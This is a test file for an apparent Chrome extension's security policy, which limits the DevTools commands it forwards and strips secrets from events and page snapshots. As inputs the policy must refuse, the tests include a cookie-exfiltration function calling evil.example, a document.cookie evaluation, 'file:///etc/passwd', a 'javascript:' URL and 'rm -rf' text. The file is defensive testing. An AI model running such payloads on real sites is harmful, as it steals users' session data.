// Pebble for Chrome, Phase 22: the command fence in front of chrome.debugger, and what leaves the browser.
import assert from 'node:assert/strict';
import { test } from 'node:test';
import { Bucket, canonicalOrigin, checkCommand, compactAX, compactSnapshot, filterAttributes, ISOLATED_FUNCTIONS, METHODS,
  newTabState, noteResult, replyFrames, sanitizeEvent, shapeResult, shareable } from './lib/policy.mjs';

const ready = { state: 'ready', origin: 'https://mail.example' };

test('origins are https anywhere and http only on this Mac', () => {
  assert.equal(canonicalOrigin('https://Mail.Example:443/inbox?x=1'), 'https://mail.example');
  assert.equal(canonicalOrigin('https://mail.example:8443/'), 'https://mail.example:8443');
  assert.equal(canonicalOrigin('http://127.0.0.1:5173/app'), 'http://127.0.0.1:5173');
  assert.equal(canonicalOrigin('http://[::1]:8080/'), 'http://[::1]:8080');
  assert.equal(canonicalOrigin('https://bücher.example/'), 'https://xn--bcher-kva.example');
  for (const bad of ['http://mail.example/', 'https://u:p@mail.example/', 'chrome://settings', 'file:///etc/passwd',
    'javascript:alert(1)', 'data:text/html,hi', 'chrome-extension://abc/popup.html', 'about:blank', '', null, 7]) {
    assert.equal(canonicalOrigin(bad), null, String(bad));
  }
  assert.equal(shareable('https://chromewebstore.google.com/detail/x'), false, 'the store is never shared');
  assert.equal(shareable('https://mail.example/'), true);
});

test('only the reviewed commands pass, with exactly their own parameters', () => {
  const tab = newTabState();
  const ok = (method, params, share = ready, extra = { granted: true }) => checkCommand(share, tab, method, params, extra);
  assert.deepEqual(ok('Page.getFrameTree', {}), { ok: true });
  assert.equal(ok('Page.navigate', { url: 'https://evil.example/' }).code, 'unsupported');
  assert.equal(ok('Runtime.evaluate', { expression: 'document.cookie', returnByValue: true, contextId: 1 }).code, 'invalid');
  assert.equal(ok('Network.getCookies', {}).code, 'unsupported');
  assert.equal(ok('Storage.getCookies', {}).code, 'unsupported');
  assert.equal(ok('Page.getFrameTree', { extra: 1 }).code, 'invalid', 'an undeclared parameter refuses');
  // Phase 24 (V1-153): deliberate change. The parameter is Chrome's real grantUniversalAccess (it was misspelt on both
  // sides, so the explicit false never reached Chrome); the misspelt key is now an undeclared parameter and refuses.
  assert.equal(ok('Page.createIsolatedWorld', { frameId: 'F', worldName: 'pebble-screen', grantUniversalAccess: true }).code, 'invalid');
  assert.equal(ok('Page.createIsolatedWorld', { frameId: 'F', worldName: 'mine', grantUniversalAccess: false }).code, 'invalid');
  assert.ok(ok('Page.createIsolatedWorld', { frameId: 'F', worldName: 'pebble-screen', grantUniversalAccess: false }).ok);
  assert.equal(ok('Page.createIsolatedWorld', { frameId: 'F', worldName: 'pebble-screen', grantUniveralAccess: false }).code, 'invalid');
  assert.equal(ok('Page.createIsolatedWorld', { frameId: 'F', worldName: 'pebble-screen' }).code, 'invalid', 'the explicit false is required');
  assert.equal(ok('Fetch.continueRequest', { requestId: 'r1', url: 'https://evil.example/' }).code, 'invalid', 'never rewritten');
  assert.equal(ok('Fetch.continueRequest', { requestId: 'r1', postData: 'x' }).code, 'invalid');
  assert.equal(ok('Fetch.failRequest', { requestId: 'r1', errorReason: 'Failed' }).code, 'invalid');
  assert.ok(ok('Fetch.enable', { patterns: [{ urlPattern: '*', requestStage: 'Request' }] }).ok);
  assert.equal(ok('Fetch.enable', { patterns: [{ urlPattern: '*', requestStage: 'Response' }] }).code, 'invalid');
  assert.ok(ok('Input.dispatchMouseEvent', { type: 'mouseMoved', x: 10.5, y: 20 }).ok);
  assert.ok(ok('Input.dispatchMouseEvent', { type: 'mousePressed', x: 1, y: 2, button: 'left', buttons: 1, clickCount: 1 }).ok);
  assert.equal(ok('Input.dispatchMouseEvent', { type: 'mousePressed', x: 1, y: 2, button: 'right', buttons: 2, clickCount: 1 }).code, 'invalid');
  assert.equal(ok('Input.dispatchMouseEvent', { type: 'mouseWheel', x: 1, y: 2 }).code, 'invalid');
  assert.ok(ok('Input.dispatchKeyEvent', { type: 'keyDown', key: 'Enter', code: 'Enter', windowsVirtualKeyCode: 13, nativeVirtualKeyCode: 13, text: '\r' }).ok);
  assert.ok(ok('Input.dispatchKeyEvent', { type: 'keyUp', key: 'Backspace', code: 'Backspace', windowsVirtualKeyCode: 8, nativeVirtualKeyCode: 51 }).ok);
  assert.equal(ok('Input.dispatchKeyEvent', { type: 'keyDown', key: 'Meta', code: 'MetaLeft', windowsVirtualKeyCode: 91, nativeVirtualKeyCode: 55 }).code, 'invalid');
  assert.equal(ok('Input.dispatchKeyEvent', { type: 'keyDown', key: 'Enter', code: 'Enter', windowsVirtualKeyCode: 13, nativeVirtualKeyCode: 13, text: 'rm -rf' }).code, 'invalid');
  assert.equal(ok('Input.insertText', { text: 'x'.repeat(4001) }).code, 'invalid');
  assert.ok(ok('Input.insertText', { text: 'hello' }).ok);
  assert.ok(METHODS.every(method => /^(Page|Runtime|DOMSnapshot|Accessibility|DOM|Input|Fetch)\./.test(method)));
  assert.ok(!METHODS.some(method => /^(Target|Browser|Network|Storage|Debugger|Emulation|Page\.navigate)/.test(method)));
});

test('scripts run only as the pinned isolated-world functions on objects resolved there', () => {
  const tab = newTabState();
  const granted = { granted: true };
  const check = params => checkCommand(ready, tab, 'Runtime.callFunctionOn', params, granted);
  assert.equal(checkCommand(ready, tab, 'DOM.resolveNode', { backendNodeId: 5, objectGroup: 'pebble-act', executionContextId: 9 }, granted).code, 'invalid',
    'a context Pebble did not create is refused (the page main world)');
  noteResult(tab, 'Page.createIsolatedWorld', { executionContextId: 9 });
  assert.ok(checkCommand(ready, tab, 'Runtime.evaluate', { expression: 'document.visibilityState', returnByValue: true, contextId: 9 }, granted).ok);
  assert.ok(checkCommand(ready, tab, 'DOM.resolveNode', { backendNodeId: 5, objectGroup: 'pebble-act', executionContextId: 9 }, granted).ok);
  noteResult(tab, 'DOM.resolveNode', { object: { objectId: 'obj-1' } });
  noteResult(tab, 'DOM.resolveNode', { object: { objectId: 'obj-2' } });
  assert.ok(check({ functionDeclaration: ISOLATED_FUNCTIONS[1], objectId: 'obj-1', arguments: [], returnByValue: true }).ok);
  assert.ok(check({ functionDeclaration: ISOLATED_FUNCTIONS[0], objectId: 'obj-1', arguments: [{ objectId: 'obj-2' }], returnByValue: true }).ok);
  assert.ok(check({ functionDeclaration: ISOLATED_FUNCTIONS[2], objectId: 'obj-1', arguments: [{ value: 'Blue' }], returnByValue: true }).ok);
  assert.equal(check({ functionDeclaration: 'function(){fetch("https://evil.example/?"+document.cookie)}', objectId: 'obj-1' }).code, 'invalid');
  assert.equal(check({ functionDeclaration: ISOLATED_FUNCTIONS[1], objectId: 'page-object' }).code, 'invalid');
  assert.equal(check({ functionDeclaration: ISOLATED_FUNCTIONS[0], objectId: 'obj-1', arguments: [{ objectId: 'page-object' }] }).code, 'invalid');
  assert.equal(check({ functionDeclaration: ISOLATED_FUNCTIONS[2], objectId: 'obj-1', arguments: [{ value: 7 }] }).code, 'invalid');
  assert.equal(check({ functionDeclaration: ISOLATED_FUNCTIONS[4], objectId: 'obj-1', arguments: [{ value: true }], returnByValue: false }).code, 'invalid');
  noteResult(tab, 'Runtime.releaseObjectGroup', {});
  assert.equal(check({ functionDeclaration: ISOLATED_FUNCTIONS[1], objectId: 'obj-1' }).code, 'invalid', 'released objects are gone');
});

test('nothing but releases runs without a live grant, away from the site, on a hand-back page, while paused or unshared', () => {
  const tab = newTabState();
  const granted = { granted: true };
  for (const [share, extra, code] of [[ready, {}, 'not_granted'], [{ ...ready, state: 'away' }, granted, 'away'],
    [{ ...ready, state: 'handback' }, granted, 'handback'], [ready, { paused: true, granted: true }, 'paused'], [null, granted, 'not_shared']]) {
    assert.equal(checkCommand(share, tab, 'DOMSnapshot.captureSnapshot', { computedStyles: [], includeDOMRects: true }, extra).code, code);
    assert.equal(checkCommand(share, tab, 'Input.insertText', { text: 'x' }, extra).code, code);
    if (share) assert.ok(checkCommand(share, tab, 'Fetch.continueRequest', { requestId: 'r' }, extra).ok, 'a paused request is always released');
  }
});

test('events leave without addresses, dialog text or request bodies', () => {
  assert.equal(sanitizeEvent('Network.requestWillBeSent', { request: {} }), null);
  assert.equal(sanitizeEvent('Runtime.consoleAPICalled', { args: [] }), null);
  const paused = sanitizeEvent('Fetch.requestPaused', { requestId: 'r', frameId: 'F', resourceType: 'XHR',
    request: { url: 'https://mail.example/api/send?token=abc', method: 'POST', postData: 'card=4111', headers: { Cookie: 'sid=1' } } });
  assert.deepEqual(paused, { requestId: 'r', frameId: 'F', resourceType: 'XHR', request: { method: 'POST', url: 'https://mail.example/' } });
  const nav = sanitizeEvent('Page.frameNavigated', { frame: { id: 'F', loaderId: 'L', url: 'https://idp.example/cb?code=SECRET', securityOrigin: 'x' } });
  assert.ok(!JSON.stringify(nav).includes('SECRET'));
  assert.deepEqual(sanitizeEvent('Page.javascriptDialogOpening', { message: 'Your code is 123456', type: 'alert' }), { type: 'alert' });
  assert.ok(!JSON.stringify(sanitizeEvent('Page.frameRequestedNavigation', { frameId: 'F', url: 'https://x/?code=1', disposition: 'currentTab', reason: 'anchorClick' })).includes('code'));
});

test('snapshots, AX trees and node descriptions leave only what Pebble reads', () => {
  const strings = ['https://mail.example/', 'F1', 'INPUT', 'type', 'password', 'value', 'hunter2', 'class', 'secret-css', 'id', 'pw', '#text', 'Typed draft'];
  const raw = { strings, documents: [{ documentURL: 0, baseURL: 0, frameId: 1, scrollOffsetX: 0, scrollOffsetY: 4,
    nodes: { parentIndex: [-1, 0], nodeName: [2, 11], backendNodeId: [10, 11], attributes: [[3, 4, 5, 6, 7, 8, 9, 10], []],
      inputValue: { index: [0], value: [6] }, nodeValue: [-1, 12], contentDocumentIndex: { index: [], value: [] } },
    layout: { nodeIndex: [0], bounds: [[1, 2, 3, 4]], text: [12] } }] };
  const compact = compactSnapshot(raw);
  const text = JSON.stringify(compact);
  for (const secret of ['hunter2', 'secret-css', 'Typed draft']) assert.ok(!text.includes(secret), secret);
  const doc = compact.documents[0];
  const attrs = doc.nodes.attributes[0].map(index => compact.strings[index]);
  assert.deepEqual(attrs, ['type', 'password', 'id', 'pw']);
  assert.equal(compact.strings[doc.documentURL], 'https://mail.example/');
  assert.equal(compact.strings[doc.nodes.nodeName[0]], 'INPUT');
  assert.equal(doc.scrollOffsetY, 4);
  assert.deepEqual(doc.layout, { nodeIndex: [0], bounds: [[1, 2, 3, 4]] });
  const ax = compactAX([{ nodeId: '1', role: { value: 'textbox' }, name: { value: 'To' }, properties: [{ name: 'editable', value: { value: 'plaintext' } },
    { name: 'url', value: { value: 'https://x/' } }], chromeRole: { value: 1 }, backendDOMNodeId: 4, childIds: [] }]);
  assert.deepEqual(ax[0].properties.map(p => p.name), ['editable']);
  assert.equal(ax[0].chromeRole, undefined);
  assert.deepEqual(filterAttributes(['type', 'text', 'value', 'secret', 'Placeholder', 'Email', 'onclick', 'x()']), ['type', 'text', 'Placeholder', 'Email']);
  const history = shapeResult('Page.getNavigationHistory', { currentIndex: 1, entries: [{ id: 1, url: 'https://bank.example/', title: 'Bank' }, { id: 2, url: 'https://mail.example/' }] }, ready);
  assert.deepEqual(history, { currentIndex: 1, entries: [{ id: 1 }, { id: 2 }] }, 'the other sites this tab visited stay private');
  const tree = shapeResult('Page.getFrameTree', { frameTree: { frame: { id: 'M', url: 'https://mail.example/inbox?x=1' }, childFrames: [
    { frame: { id: 'A', parentId: 'M', url: 'https://ads.example/slot?uid=42', securityOrigin: 'https://ads.example', name: 'ad' } }] } }, ready);
  assert.equal(tree.frameTree.frame.url, 'https://mail.example/inbox?x=1', 'the shared site keeps its address');
  assert.equal(tree.frameTree.childFrames[0].frame.url, 'https://ads.example/');
  assert.equal(tree.frameTree.childFrames[0].frame.name, undefined);
});

test('large replies are chunked under the 1 MiB message cap and reassemble exactly', () => {
  const small = replyFrames(3, { ok: true, result: { a: 1 } });
  assert.deepEqual(small, [{ type: 'reply', id: 3, ok: true, result: { a: 1 } }]);
  const big = { ok: true, result: { strings: Array.from({ length: 30000 }, (_, i) => `s${i}-ünïcode-` + 'x'.repeat(60)) } };
  const frames = replyFrames(4, big);
  assert.ok(frames.length > 1 && frames.every(frame => frame.type === 'chunk' && frame.id === 4));
  assert.deepEqual(frames.map(frame => frame.seq), frames.map((_, i) => i));
  assert.equal(frames.filter(frame => frame.last).length, 1);
  for (const frame of frames) assert.ok(new TextEncoder().encode(JSON.stringify(frame)).length < 1 << 20);
  const bytes = Buffer.concat(frames.map(frame => Buffer.from(frame.data, 'base64')));
  assert.deepEqual(JSON.parse(bytes.toString('utf8')), { type: 'reply', id: 4, ...big });
  const huge = replyFrames(5, { ok: true, result: { x: 'y'.repeat(2048) } }, { maxFrame: 512, chunkBytes: 256, maxReply: 1024 });
  assert.deepEqual(huge, [{ type: 'reply', id: 5, ok: false, error: { code: 'too_large', message: 'The answer is larger than Pebble accepts.' } }]);
});

test('the command bucket refuses bursts and refills', () => {
  const bucket = new Bucket(2, 1, 0);
  assert.equal(bucket.take(0), true);
  assert.equal(bucket.take(0), true);
  assert.equal(bucket.take(0), false);
  assert.equal(bucket.take(1000), true);
});
